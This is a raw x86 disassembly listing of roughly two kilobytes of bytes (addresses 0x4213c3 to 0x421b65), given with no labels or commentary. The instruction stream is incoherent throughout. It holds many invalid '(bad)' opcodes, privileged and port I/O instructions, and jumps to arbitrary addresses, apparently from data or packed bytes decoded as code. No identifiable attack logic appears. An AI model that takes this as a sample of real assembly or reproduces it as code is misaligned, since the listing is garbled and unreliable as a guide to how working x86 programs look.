  4213c3:	test   BYTE PTR [ebx],bl
  4213c5:	test   al,0x7a
  4213c7:	imul   eax,DWORD PTR [ecx+0x61],0x35
  4213cb:	jle    0x4213cc
  4213cd:	or     ecx,DWORD PTR [edx+0x2ca5db50]
  4213d3:	sub    al,BYTE PTR [ecx+0x1c]
  4213d6:	popf   
  4213d7:	mov    ch,0xac
  4213d9:	lock add BYTE PTR ds:[edx],0x32
  4213de:	push   ebx
  4213df:	inc    esi
  4213e0:	sub    DWORD PTR [edi+ecx*4],eax
  4213e3:	push   ss
  4213e4:	xchg   edx,eax
  4213e5:	clc    
  4213e6:	inc    ebp
  4213e7:	dec    edi
  4213e8:	sbb    eax,0xf47193c5
  4213ed:	cmp    ebp,DWORD PTR [si]
  4213f0:	inc    si
  4213f2:	inc    eax
  4213f3:	add    ebp,DWORD PTR [eax+0x5b703797]
  4213f9:	imul   BYTE PTR [ebx+0x4b34a19e]
  4213ff:	ret    0x96ec
  421402:	stos   BYTE PTR es:[edi],al
  421403:	call   0x98c05868
  421408:	sbb    dh,dh
  42140a:	inc    ecx
  42140b:	mov    ss,WORD PTR [esi-0x58]
  42140e:	mov    BYTE PTR [esi+0x16b38b39],cl
  421414:	pop    ss
  421415:	push   ecx
  421416:	jecxz  0x421441
  421418:	stos   BYTE PTR es:[edi],al
  421419:	lods   al,BYTE PTR ds:[esi]
  42141a:	fst    DWORD PTR gs:[esi]
  42141d:	fdivr  st,st(3)
  42141f:	mov    esp,edx
  421421:	js     0x4213dc
  421423:	lds    ebx,FWORD PTR [esi+eax*8+0x34]
  421427:	iret   
  421428:	dec    esp
  421429:	cmp    bh,BYTE PTR [ebp+0x28a240d8]
  42142f:	mov    eax,ds:0x9c877501
  421434:	stos   DWORD PTR es:[edi],eax
  421435:	fmulp  st(0),st
  421437:	out    dx,al
  421438:	inc    edx
  421439:	call   0x22e8f219
  42143e:	out    dx,eax
  42143f:	and    BYTE PTR [ebp-0x3b],dh
  421442:	js     0x421461
  421444:	xlat   BYTE PTR ds:[ebx]
  421445:	je     0x760f7823
  42144b:	div    ah
  42144d:	add    DWORD PTR [ebp-0x54aaac71],ebp
  421453:	pop    eax
  421454:	cmc    
  421455:	dec    esi
  421456:	adc    al,0x8
  421458:	adc    eax,0x565cb837
  42145d:	jg     0x42148f
  42145f:	push   ds
  421460:	xor    DWORD PTR [esi],edi
  421462:	(bad)
  421465:	sub    DWORD PTR [ebp+0x5],ebx
  421468:	gs loop 0x42142d
  42146b:	dec    edx
  42146c:	gs dec edx
  42146e:	ss fcmove st,st(3)
  421471:	ds xchg ebp,eax
  421473:	outs   dx,BYTE PTR ds:[esi]
  421474:	(bad)  
  421476:	aad    0x61
  421478:	pop    edx
  421479:	xlat   BYTE PTR ds:[ebx]
  42147a:	sbb    DWORD PTR [eax],0xffffffa1
  42147d:	out    0xd2,al
  42147f:	pop    esi
  421480:	mov    ah,0x0
  421482:	scas   al,BYTE PTR es:[edi]
  421483:	loop   0x42142d
  421485:	(bad)  [esi-0x3057aa3f]
  42148b:	push   esi
  42148c:	push   esp
  42148d:	dec    ebp
  42148e:	xchg   edi,eax
  42148f:	gs ins DWORD PTR es:[edi],dx
  421491:	jge    0x421442
  421493:	xchg   ebp,eax
  421494:	push   ebp
  421495:	cmp    eax,DWORD PTR [edx+0x5bd796b5]
  42149b:	sbb    BYTE PTR [esi+eiz*8-0x7b],bh
  42149f:	xchg   ebx,eax
  4214a0:	in     al,dx
  4214a1:	leave  
  4214a2:	fidivr WORD PTR [ecx+0xe]
  4214a5:	outs   dx,DWORD PTR ds:[esi]
  4214a6:	test   DWORD PTR [ecx+0x44c10606],edi
  4214ac:	mov    BYTE PTR [ebp-0x5e291b0a],bh
  4214b2:	into   
  4214b3:	jge    0x421511
  4214b5:	push   cs
  4214b6:	stos   BYTE PTR es:[edi],al
  4214b7:	lods   al,BYTE PTR ds:[esi]
  4214b8:	xchg   esp,eax
  4214b9:	pop    esi
  4214ba:	mov    eax,ecx
  4214bc:	es xchg esp,eax
  4214be:	add    ah,bl
  4214c0:	clc    
  4214c1:	js     0x421498
  4214c3:	jo     0x421537
  4214c5:	mov    dh,0xcd
  4214c7:	cmp    ebp,ebp
  4214c9:	mov    es,esi
  4214cb:	nop
  4214cc:	pop    ecx
  4214cd:	or     bl,ah
  4214cf:	mov    eax,0xfb77836f
  4214d4:	mov    WORD PTR [esi+0x4a],?
  4214d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214d8:	icebp  
  4214d9:	sub    bl,BYTE PTR [edx]
  4214db:	in     eax,dx
  4214dc:	out    dx,al
  4214dd:	inc    eax
  4214de:	lock cmp eax,DWORD PTR [eax-0x1d]
  4214e2:	(bad)  
  4214e3:	pop    eax
  4214e4:	mov    edi,0xbd71edec
  4214e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214ea:	in     al,dx
  4214eb:	cmp    esi,DWORD PTR ds:0x11c7858d
  4214f1:	data16 aaa 
  4214f3:	add    eax,0x8b80b562
  4214f8:	or     ah,BYTE PTR [ebp-0x6c2f1f76]
  4214fe:	mov    eax,ds:0xe8a1bf87
  421503:	outs   dx,DWORD PTR ds:[esi]
  421504:	scas   eax,DWORD PTR es:[edi]
  421505:	jae    0x4214c4
  421507:	push   0x9d2678d2
  42150c:	sub    edi,DWORD PTR [edi]
  42150e:	lds    ebp,FWORD PTR [edi+0x35]
  421511:	cmp    DWORD PTR [eax],edx
  421513:	inc    eax
  421514:	adc    al,0xd2
  421516:	les    ecx,FWORD PTR [eax]
  421518:	test   al,0x7f
  42151a:	aam    0x1f
  42151c:	cmp    BYTE PTR [esi+0x10],ah
  42151f:	dec    edx
  421520:	sahf   
  421521:	xchg   edx,eax
  421522:	sbb    eax,DWORD PTR [edx]
  421524:	or     eax,0x3e50699b
  421529:	jne    0x421565
  42152b:	mov    ebx,0x36bd6ac5
  421530:	popf   
  421531:	shl    DWORD PTR [ebp+0x12953a7a],cl
  421537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421538:	shl    ch,cl
  42153a:	or     ecx,0xffffff8e
  42153d:	lock pusha 
  42153f:	outs   dx,BYTE PTR ds:[esi]
  421540:	add    dl,BYTE PTR [edi+0x41]
  421543:	fdiv   DWORD PTR ds:0xe6164b4a
  421549:	xchg   BYTE PTR [eax-0x70],dl
  42154c:	xchg   ebp,edx
  42154e:	xor    eax,0x9d3d7b3
  421553:	or     eax,0x678c4fa1
  421558:	fild   WORD PTR [ecx+eiz*1+0x4c]
  42155c:	or     DWORD PTR [ebp+esi*2-0x369928ef],ebp
  421563:	getsec 
  421565:	pop    ebx
  421566:	pop    es
  421567:	jg     0x421588
  421569:	xor    BYTE PTR [eax+0x6f9b67e],ah
  42156f:	fdiv   DWORD PTR gs:[ebp+0x1cafddc7]
  421576:	sahf   
  421577:	arpl   WORD PTR [edx],bp
  421579:	fcomp  QWORD PTR ds:0x68208a1c
  42157f:	test   eax,0x37b291cb
  421584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421585:	es (bad) 
  421587:	lods   al,BYTE PTR ds:[esi]
  421588:	sub    bh,BYTE PTR [edx-0x40893873]
  42158e:	push   es
  42158f:	pop    edi
  421590:	pop    ss
  421591:	xchg   DWORD PTR [ecx+0x57],edx
  421594:	pop    es
  421595:	push   0xffffffb8
  421597:	cs test edx,0xb3f56d3c
  42159e:	das    
  42159f:	cs xor al,0x8d
  4215a2:	dec    edx
  4215a3:	mov    al,ds:0x19427b5
  4215a8:	ds and edi,esi
  4215ab:	or     eax,DWORD PTR [ebp-0x658c0df3]
  4215b1:	fs cmc 
  4215b3:	test   al,0x99
  4215b5:	fmul   DWORD PTR [ecx-0x14646389]
  4215bb:	sti    
  4215bc:	fistp  WORD PTR [edx-0x5bc76f64]
  4215c2:	sub    BYTE PTR [eax],ch
  4215c4:	jns    0x4215a5
  4215c6:	lahf   
  4215c7:	frstor [eax+0x65e8443b]
  4215cd:	push   eax
  4215ce:	imul   ecx,DWORD PTR [eax-0x57e35c2e],0x61ba996d
  4215d8:	pop    edi
  4215d9:	inc    ecx
  4215da:	dec    eax
  4215db:	jp     0x42160c
  4215dd:	push   ecx
  4215de:	sub    eax,0x874d7e4b
  4215e3:	sub    DWORD PTR [ebp+0x678d484a],esi
  4215e9:	push   esp
  4215ea:	or     ecx,DWORD PTR [ecx+0x7b]
  4215ed:	fucomp st(4)
  4215ef:	or     al,0xe4
  4215f1:	hlt    
  4215f2:	jae    0x4215ac
  4215f4:	mov    WORD PTR [ebp+ecx*8+0x1c],cs
  4215f8:	lds    eax,FWORD PTR [esi+0x9]
  4215fb:	dec    edx
  4215fc:	sti    
  4215fd:	mov    ch,0xc1
  4215ff:	pop    ds
  421600:	sbb    al,0x1f
  421602:	repnz loope 0x42162e
  421605:	out    dx,al
  421606:	sbb    eax,0x2bc10ae6
  42160b:	cmp    ebp,esp
  42160d:	cmp    eax,0xdc65edbf
  421612:	stos   DWORD PTR es:[edi],eax
  421613:	sbb    DWORD PTR [ebp+0x46],eax
  421616:	mov    esp,0x90c91800
  42161b:	(bad)  
  42161c:	adc    bl,ch
  42161e:	inc    esp
  42161f:	inc    eax
  421620:	aad    0x85
  421622:	loopne 0x4215d3
  421624:	mov    dl,0x4b
  421626:	jbe    0x4215e5
  421628:	call   0xe249:0xe7a286a5
  42162f:	mov    eax,ecx
  421631:	imul   ebp,edx,0x62e8976e
  421637:	or     DWORD PTR [bp+di-0x6182],0xeaeea55e
  421640:	loopne 0x421613
  421642:	add    ch,BYTE PTR [ebp+0x55813db6]
  421648:	cs jno 0x421691
  42164b:	add    ecx,ecx
  42164d:	xchg   ecx,eax
  42164e:	inc    esi
  42164f:	push   ds
  421650:	mov    ah,0x5c
  421652:	imul   ebx,DWORD PTR [esi],0xf
  421655:	imul   ebp,DWORD PTR [edi-0x18],0xec5fc202
  42165c:	repnz pop es
  42165e:	inc    DWORD PTR [esi+0x6a]
  421661:	enter  0xcaf2,0x44
  421665:	xchg   ebp,esp
  421667:	cmp    ah,BYTE PTR [ecx+edi*2+0x1]
  42166b:	daa    
  42166c:	push   esp
  42166d:	mov    bl,0xb
  42166f:	sti    
  421670:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  421672:	mov    eax,0x608e1a1a
  421677:	mov    ch,0x66
  421679:	sub    al,0xd
  42167b:	mov    bh,cl
  42167d:	or     bh,BYTE PTR ds:0xb6ff440d
  421683:	mov    BYTE PTR [edi+0x56745482],al
  421689:	xchg   edx,eax
  42168a:	mov    bh,0x2d
  42168c:	pushf  
  42168d:	sbb    ah,cl
  42168f:	jge    0x421682
  421691:	mov    eax,0x140dedf9
  421696:	popf   
  421697:	scas   eax,DWORD PTR es:[edi]
  421698:	js     0x421714
  42169a:	fsub   QWORD PTR [esi-0x63245cb1]
  4216a0:	mov    bl,0x9d
  4216a2:	sbb    DWORD PTR [eax-0x54c7de4d],ecx
  4216a8:	sbb    DWORD PTR [ebx-0x69966feb],0xeb2a241b
  4216b2:	shr    ebp,0xcf
  4216b5:	mov    edx,0xdfd131fe
  4216ba:	and    bh,dl
  4216bc:	cld    
  4216bd:	aam    0x2c
  4216bf:	dec    ebx
  4216c0:	addr16 aad 0x7f
  4216c3:	add    esp,edx
  4216c5:	xchg   esp,eax
  4216c6:	mov    ds:0x476a04d2,eax
  4216cb:	xchg   edi,eax
  4216cc:	sbb    al,0x22
  4216ce:	cli    
  4216cf:	mov    al,ds:0x5eefb6a7
  4216d4:	add    al,BYTE PTR [ecx-0x1a]
  4216d7:	push   ss
  4216d8:	jae    0x42168b
  4216da:	adc    al,0x28
  4216dc:	dec    ebx
  4216dd:	repz (bad) [ebx-0x70]
  4216e1:	push   edx
  4216e2:	push   ds
  4216e3:	mov    bh,0x88
  4216e5:	pop    edx
  4216e6:	retf   0xa773
  4216e9:	or     DWORD PTR [edi],edi
  4216eb:	xor    bh,BYTE PTR [ebx+0xa]
  4216ee:	xor    DWORD PTR [edi],edi
  4216f0:	in     al,dx
  4216f1:	div    ebp
  4216f3:	icebp  
  4216f4:	push   es
  4216f5:	cmp    BYTE PTR [ebp-0x21],dl
  4216f8:	inc    ebp
  4216f9:	jnp    0x4216bd
  4216fb:	aas    
  4216fc:	into   
  4216fd:	es jl  0x421687
  421700:	test   DWORD PTR [eax],ebp
  421702:	jb     0x4216d6
  421704:	sbb    BYTE PTR ds:0x504e6b0e,0xe8
  42170b:	jecxz  0x421787
  42170d:	(bad)  
  42170e:	inc    al
  421710:	repz icebp 
  421712:	and    eax,0xce04c39e
  421717:	dec    esp
  421718:	shl    BYTE PTR [ebx-0x52],cl
  42171b:	stos   BYTE PTR es:[edi],al
  42171c:	sbb    DWORD PTR [ebp-0x8],edx
  42171f:	sti    
  421720:	imul   ecx,esp,0x33eb4c11
  421726:	out    dx,eax
  421727:	sbb    ecx,edi
  421729:	sbb    BYTE PTR [eax+0x2566100],0x23
  421730:	leave  
  421731:	cdq    
  421732:	pop    edx
  421733:	adc    ecx,DWORD PTR [eax]
  421735:	sbb    dh,BYTE PTR [edx+0x709e6c3a]
  42173b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42173d:	and    BYTE PTR [esi-0x17ec1640],0x8f
  421744:	pop    esp
  421745:	stos   DWORD PTR es:[edi],eax
  421746:	gs mov ch,0x72
  421749:	inc    ebx
  42174a:	adc    BYTE PTR [edx-0x6e],0xa0
  42174e:	std    
  42174f:	push   eax
  421750:	push   ds
  421751:	jge    0x4216df
  421753:	das    
  421754:	scas   al,BYTE PTR es:[edi]
  421755:	lock mov dh,0xf3
  421758:	xor    BYTE PTR [edi-0x64],cl
  42175b:	pop    edi
  42175c:	ret    
  42175d:	das    
  42175e:	jmp    0x4217c8
  421760:	dec    esi
  421761:	push   ds
  421762:	xchg   ebp,eax
  421763:	mov    ebx,0x36134587
  421768:	outs   dx,BYTE PTR ds:[esi]
  421769:	jl     0x421712
  42176b:	outs   dx,DWORD PTR ds:[esi]
  42176c:	and    ebx,DWORD PTR [ecx-0x65eb5c6a]
  421772:	or     eax,0xf075bad0
  421777:	pop    ds
  421778:	push   eax
  421779:	shr    bh,0x27
  42177c:	ds inc eax
  42177e:	fcomp  QWORD PTR [eax]
  421780:	jmp    0x12db:0x6c41b9a
  421787:	jne    0x4217ac
  421789:	pop    edx
  42178a:	and    eax,0x131746cb
  42178f:	bound  esp,QWORD PTR [ebp+0x7c9193df]
  421795:	clc    
  421796:	push   ss
  421797:	pusha  
  421798:	jnp    0x421804
  42179a:	not    BYTE PTR [edx-0x1d]
  42179d:	and    al,0x1a
  42179f:	adc    ebx,DWORD PTR ds:0x52c1809f
  4217a5:	loop   0x4217bd
  4217a7:	xchg   ebp,eax
  4217a8:	jns    0x421751
  4217aa:	mov    dl,0xb4
  4217ac:	jmp    0xb2e369b
  4217b1:	pop    ds
  4217b2:	inc    edi
  4217b3:	xor    eax,0x8effbd6a
  4217b8:	scas   eax,DWORD PTR es:[edi]
  4217b9:	into   
  4217ba:	sbb    cl,BYTE PTR [ebp-0xa]
  4217bd:	or     ch,BYTE PTR [edi-0x769d0be8]
  4217c3:	in     al,0x34
  4217c5:	(bad)  [ecx+esi*4]
  4217c8:	push   ss
  4217c9:	mov    DWORD PTR [edi-0x54],ecx
  4217cc:	jno    0x421799
  4217ce:	dec    edx
  4217cf:	sahf   
  4217d0:	nop
  4217d1:	xchg   esp,eax
  4217d2:	rcr    eax,1
  4217d4:	or     ch,0xca
  4217d7:	cmp    ah,bh
  4217d9:	mov    al,0xed
  4217db:	lds    esi,FWORD PTR [esi+0xae27ace]
  4217e1:	fdivr  st,st(5)
  4217e3:	push   edi
  4217e4:	test   DWORD PTR [ebx],eax
  4217e6:	push   ds
  4217e7:	mov    esi,0x9ed8bb69
  4217ec:	mov    ch,0x96
  4217ee:	add    dl,bh
  4217f0:	or     esp,DWORD PTR [esi]
  4217f2:	dec    esp
  4217f3:	cmp    DWORD PTR ds:0xdf7e7e64,ebx
  4217f9:	xchg   ebp,eax
  4217fa:	xchg   BYTE PTR [ebx],bl
  4217fc:	jno    0x4217b0
  4217fe:	xchg   edi,eax
  4217ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421800:	fwait
  421801:	loopne 0x421823
  421803:	les    ebx,FWORD PTR [edi+eax*2+0x3c]
  421807:	and    eax,0x748645ff
  42180c:	jnp    0x4217c1
  42180e:	and    al,0x92
  421810:	push   ds
  421811:	push   cs
  421812:	mov    al,0x85
  421814:	ja     0x421857
  421816:	jmp    0x4217ad
  421818:	pop    esi
  421819:	dec    ebx
  42181a:	mov    ah,0xd9
  42181c:	or     ebx,DWORD PTR [ebx+0x41c4a7d7]
  421822:	mov    esp,DWORD PTR [eax+esi*1]
  421825:	or     ecx,esi
  421827:	adc    al,0xd5
  421829:	out    0xfb,eax
  42182b:	mov    ch,0xaa
  42182d:	repz mov ah,0x9d
  421830:	cwde   
  421831:	in     al,dx
  421832:	or     ebx,DWORD PTR [edx-0x62b2f8c8]
  421838:	aam    0x11
  42183a:	in     eax,dx
  42183b:	sar    DWORD PTR [edx],cl
  42183d:	lods   al,BYTE PTR ds:[esi]
  42183e:	push   es
  42183f:	push   ecx
  421840:	and    BYTE PTR [ebp+0x7],dh
  421843:	loope  0x421896
  421845:	cmp    DWORD PTR [ecx-0x7daa0671],0x1e
  42184c:	lods   al,BYTE PTR ds:[esi]
  42184d:	jb     0x421819
  42184f:	pop    es
  421850:	jnp    0x42189e
  421852:	repnz xor DWORD PTR [eax],ebp
  421855:	and    BYTE PTR [ecx+0x448f04d8],bh
  42185b:	ret    
  42185c:	mov    cl,0x92
  42185e:	ror    dh,cl
  421860:	add    BYTE PTR [ebx],ah
  421862:	push   0x2edf8b7a
  421867:	sbb    bh,BYTE PTR [ebp-0x31]
  42186a:	pop    eax
  42186b:	ud0    eax,DWORD PTR [esi+eiz*4]
  42186f:	in     eax,dx
  421870:	xor    ebx,DWORD PTR [edi-0x7b123eb9]
  421876:	fld    st(1)
  421878:	push   ss
  421879:	cmp    BYTE PTR [ebx+esi*8+0x58ccdcb2],al
  421880:	dec    ecx
  421881:	add    dl,ah
  421883:	out    0xca,al
  421885:	lahf   
  421886:	cdq    
  421887:	int3   
  421888:	xor    ecx,esi
  42188a:	lahf   
  42188b:	fcmovu st,st(6)
  42188d:	std    
  42188e:	ss push ss
  421890:	cmp    dh,BYTE PTR [edi-0x11]
  421893:	mov    esp,0x6668a07f
  421898:	jg     0x4218a3
  42189a:	cmp    dl,BYTE PTR [esi+0x44]
  42189d:	rol    BYTE PTR [ebp-0x467189d],0x49
  4218a4:	pop    ebx
  4218a5:	lock jne 0x421908
  4218a8:	fiadd  WORD PTR [ebx]
  4218aa:	mov    edi,0xf0d4ef80
  4218af:	dec    ecx
  4218b0:	push   ds
  4218b1:	jecxz  0x421863
  4218b3:	repnz sub DWORD PTR [ebp+0x7b39d364],edi
  4218ba:	sahf   
  4218bb:	pop    edi
  4218bc:	dec    edi
  4218bd:	or     esi,DWORD PTR [ebx]
  4218bf:	scas   al,BYTE PTR es:[edi]
  4218c0:	into   
  4218c1:	mov    ebp,0xa95cb4fb
  4218c6:	pop    esi
  4218c7:	lea    ecx,[edx+0x7f644ec7]
  4218cd:	in     eax,0x58
  4218cf:	ss es sti 
  4218d2:	add    BYTE PTR [edx-0x725c58b],bh
  4218d8:	xchg   ebx,eax
  4218d9:	sub    esi,DWORD PTR [ebp+0x7f]
  4218dc:	push   ds
  4218dd:	mov    ch,0xba
  4218df:	and    al,0xf3
  4218e1:	xlat   BYTE PTR ds:[ebx]
  4218e2:	in     al,dx
  4218e3:	add    BYTE PTR [ebx-0x8a9239a],al
  4218e9:	dec    ebx
  4218ea:	mov    BYTE PTR [ebx+0x4c],dh
  4218ed:	data16 cmp BYTE PTR [edi],dh
  4218f0:	inc    eax
  4218f1:	adc    ebx,DWORD PTR [eax+0x19]
  4218f4:	or     al,0x56
  4218f6:	sub    cl,ah
  4218f8:	mov    esp,0x58222390
  4218fd:	adc    BYTE PTR [ebp-0x47],bl
  421900:	iret   
  421901:	mov    bl,0x9e
  421903:	push   0x365c3b48
  421908:	dec    esp
  421909:	adc    edi,DWORD PTR [edi+0x9]
  42190c:	int3   
  42190d:	mov    esp,0x65c36947
  421912:	nop
  421913:	and    al,0x74
  421915:	xor    eax,0xbb731d9f
  42191a:	addr16 dec ebx
  42191c:	lds    ebp,FWORD PTR [edx]
  42191e:	adc    edi,esi
  421920:	test   al,0x9f
  421922:	mov    cs,WORD PTR [eax-0x23f9873b]
  421928:	fsubrp st(1),st
  42192a:	jnp    0x4218fc
  42192c:	test   eax,0x73253b9e
  421931:	mov    al,ds:0x786fe95a
  421936:	lahf   
  421937:	inc    ebp
  421938:	mov    dl,0x43
  42193a:	iret   
  42193b:	dec    ebx
  42193c:	lock cli 
  42193e:	add    BYTE PTR [eax],bl
  421940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421941:	shl    al,0x74
  421944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421945:	xor    DWORD PTR [esi+0x77161be3],0x3177f69d
  42194f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  421951:	dec    esp
  421952:	sahf   
  421953:	(bad)  
  421954:	add    esi,DWORD PTR cs:[eax+0x2f]
  421958:	(bad)  
  421959:	fcmovnbe st,st(6)
  42195b:	and    ecx,DWORD PTR [edx]
  42195d:	(bad)  
  42195e:	(bad)  
  42195f:	xchg   esi,eax
  421960:	leave  
  421961:	sbb    DWORD PTR [eax],0xffffffed
  421964:	jmp    0x2aa8b0bf
  421969:	pop    esp
  42196a:	and    eax,0xe7d2f0f4
  42196f:	into   
  421970:	sbb    dh,dl
  421972:	dec    edx
  421973:	add    DWORD PTR [eax+0x17],ebp
  421976:	(bad)  
  421977:	sbb    BYTE PTR [ebx+0x6e05ae43],dl
  42197d:	iret   
  42197e:	inc    esp
  42197f:	xchg   esp,eax
  421980:	xor    DWORD PTR [ebp-0x505998de],esp
  421986:	push   ecx
  421987:	mov    ebp,0x88135524
  42198c:	jo     0x421996
  42198e:	push   ecx
  42198f:	jg     0x42193d
  421991:	mov    edi,0xe36f240
  421996:	data16 add BYTE PTR [edi],ch
  421999:	addr16 xchg edx,eax
  42199b:	and    ch,ah
  42199d:	cmp    BYTE PTR [ecx-0x35f54e55],al
  4219a3:	(bad)  
  4219a4:	pop    eax
  4219a5:	mov    BYTE PTR [eax-0x5081db0f],dh
  4219ab:	ins    DWORD PTR es:[edi],dx
  4219ac:	popf   
  4219ad:	xchg   ebx,eax
  4219ae:	push   edi
  4219af:	and    al,0xae
  4219b1:	in     al,dx
  4219b2:	icebp  
  4219b3:	(bad)  
  4219b4:	pop    ebp
  4219b5:	stc    
  4219b6:	dec    edx
  4219b7:	rcl    ebx,cl
  4219b9:	outs   dx,DWORD PTR ds:[esi]
  4219ba:	lock mov esi,0x692d1ab0
  4219c0:	sbb    esi,DWORD PTR [bp+si+0x71ec]
  4219c5:	test   DWORD PTR [eax+ebx*4+0x2d8b6e65],edx
  4219cc:	push   ds
  4219cd:	ds stos BYTE PTR es:[edi],al
  4219cf:	lock test DWORD PTR [esi-0x5d],ebx
  4219d3:	xor    bl,BYTE PTR [edi]
  4219d5:	mov    eax,fs
  4219d7:	or     cl,bl
  4219d9:	xchg   esp,eax
  4219da:	jmp    0x421a3d
  4219dc:	test   eax,0xc13d51a1
  4219e1:	fist   WORD PTR [eax]
  4219e3:	inc    BYTE PTR [eax+0x8]
  4219e6:	cmp    eax,0x6d326868
  4219eb:	mov    dh,0xc7
  4219ed:	shr    DWORD PTR [eax],1
  4219ef:	push   0x877302d3
  4219f4:	sbb    al,0xae
  4219f6:	ins    DWORD PTR es:[edi],dx
  4219f7:	xchg   edi,eax
  4219f8:	xor    DWORD PTR [ebx+0x68439275],ecx
  4219fe:	shr    DWORD PTR [ebp+0xc8207ed],1
  421a04:	push   eax
  421a05:	or     eax,DWORD PTR ds:0x8f7146a5
  421a0b:	push   ecx
  421a0c:	imul   edx,DWORD PTR [edx+edi*1],0xd1ab4d8e
  421a13:	dec    DWORD PTR [eax]
  421a15:	mov    ch,0xce
  421a17:	push   ss
  421a18:	iret   
  421a19:	jnp    0x421a2d
  421a1b:	xchg   ebx,eax
  421a1c:	scas   eax,DWORD PTR es:[edi]
  421a1d:	sar    DWORD PTR [esi],cl
  421a1f:	jp     0x421a14
  421a21:	push   es
  421a22:	out    dx,eax
  421a23:	retf   0x6624
  421a26:	cmp    dh,cl
  421a28:	pop    ebp
  421a29:	mov    cl,0x2b
  421a2b:	push   esp
  421a2c:	xchg   BYTE PTR [ebx+0x79d68cee],dl
  421a32:	arpl   WORD PTR ds:0x757f3ba7,bp
  421a38:	scas   al,BYTE PTR es:[edi]
  421a39:	mov    esi,0x2f5af74a
  421a3f:	jl     0x421a57
  421a41:	pop    esp
  421a42:	mov    ebx,0x7b911320
  421a47:	sub    edx,edx
  421a49:	sbb    DWORD PTR [edi-0x51c53681],0x16
  421a50:	push   ecx
  421a51:	jmp    0x868a61b2
  421a56:	sub    al,0x42
  421a58:	mov    WORD PTR [eax-0x7ba36348],cs
  421a5e:	fwait
  421a5f:	retf   
  421a60:	dec    edx
  421a61:	fs xchg ebx,eax
  421a63:	adc    DWORD PTR [ebx+0x640036a0],edi
  421a69:	push   es
  421a6a:	jb     0x421a45
  421a6c:	push   ss
  421a6d:	mov    bl,0x2a
  421a6f:	jae    0x421a67
  421a71:	ins    DWORD PTR es:[edi],dx
  421a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a73:	add    dh,BYTE PTR [eax]
  421a75:	push   ss
  421a76:	ja     0x421a36
  421a78:	pop    esi
  421a79:	push   ds
  421a7a:	or     BYTE PTR [ecx-0x8893dee],cl
  421a80:	stc    
  421a81:	ficom  DWORD PTR [ecx+0xe]
  421a84:	das    
  421a85:	xchg   ebx,eax
  421a86:	sar    BYTE PTR [ebx+0x7977ea5a],0xdb
  421a8d:	ror    BYTE PTR ds:0x926484fe,1
  421a93:	shl    bh,0xb1
  421a96:	ja     0x421a56
  421a98:	neg    esi
  421a9a:	ins    DWORD PTR es:[edi],dx
  421a9b:	(bad)  [edi-0x42]
  421a9e:	cmp    edx,0xffffffd8
  421aa1:	jne    0x421a26
  421aa3:	mov    DWORD PTR [ebx],edi
  421aa5:	sahf   
  421aa6:	inc    edi
  421aa7:	scas   al,BYTE PTR es:[edi]
  421aa8:	cli    
  421aa9:	jo     0x421a94
  421aab:	xor    DWORD PTR [edx],ebx
  421aad:	push   ebx
  421aae:	mov    al,0xe3
  421ab0:	dec    eax
  421ab1:	cmp    ch,cl
  421ab3:	adc    eax,0x9b6e8faa
  421ab8:	sbb    esp,DWORD PTR [ebx-0xe1d0069]
  421abe:	mov    bh,dh
  421ac0:	fnsave [ebx+ebx*2-0x3b6d936e]
  421ac7:	mov    ch,0x26
  421ac9:	out    dx,al
  421aca:	xor    eax,0x83d5dc1c
  421acf:	mov    ch,0xc6
  421ad1:	stos   BYTE PTR es:[edi],al
  421ad2:	shr    DWORD PTR [ebx-0x44523b0f],cl
  421ad8:	inc    eax
  421ad9:	les    ebx,FWORD PTR [eax]
  421adb:	test   al,0x10
  421add:	jb     0x421b3b
  421adf:	xor    edx,DWORD PTR [esi]
  421ae1:	test   al,0xf4
  421ae3:	(bad)  
  421ae4:	xchg   edi,eax
  421ae5:	sbb    eax,0x2ee93a01
  421aea:	pop    edi
  421aeb:	cli    
  421aec:	repnz push edx
  421aee:	aad    0xac
  421af0:	les    esi,FWORD PTR [edi]
  421af2:	std    
  421af3:	sbb    al,0x8b
  421af5:	xchg   ecx,eax
  421af6:	jecxz  0x421aaf
  421af8:	sub    al,0x36
  421afa:	jnp    0x421abe
  421afc:	fwait
  421afd:	mov    bl,BYTE PTR [esi-0x2b]
  421b00:	icebp  
  421b01:	dec    esi
  421b02:	jmp    0x421ae4
  421b04:	push   edi
  421b05:	popf   
  421b06:	mov    dl,0xe0
  421b08:	pop    edx
  421b09:	jo     0x421a96
  421b0b:	repnz mov edi,0x229f3018
  421b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b12:	inc    edi
  421b13:	daa    
  421b14:	xor    ch,BYTE PTR [ecx-0x596ce5]
  421b1a:	ret    
  421b1b:	scas   al,BYTE PTR es:[edi]
  421b1c:	mov    ecx,0x6e518520
  421b21:	jne    0x421ba2
  421b23:	xor    edx,DWORD PTR [ecx+eax*4]
  421b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b27:	outs   dx,BYTE PTR ds:[esi]
  421b28:	pop    eax
  421b29:	test   BYTE PTR [eax+0x2a],al
  421b2c:	loopne 0x421b89
  421b2e:	cwde   
  421b2f:	mov    ecx,DWORD PTR ds:0x7a98e272
  421b35:	sub    BYTE PTR [edi+0x31],0x6d
  421b39:	jnp    0x421b9d
  421b3b:	and    BYTE PTR ds:0xf2a8b17f,ah
  421b41:	sub    DWORD PTR [eax],edx
  421b43:	dec    ebx
  421b44:	cmp    ebx,DWORD PTR [edi-0x47]
  421b47:	sbb    al,0xd8
  421b49:	cld    
  421b4a:	dec    esi
  421b4b:	jg     0x421bcc
  421b4d:	inc    esi
  421b4e:	jl     0x421b96
  421b50:	lahf   
  421b51:	mov    ch,0x82
  421b53:	sub    esp,DWORD PTR [eax+eiz*8+0x32f6240c]
  421b5a:	ja     0x421b26
  421b5c:	xlat   BYTE PTR ds:[ebx]
  421b5d:	in     al,dx
  421b5e:	sbb    al,bh
  421b60:	adc    BYTE PTR [ecx+0x47],ch
  421b63:	and    esi,ebx
  421b65:	repz repz dec edx
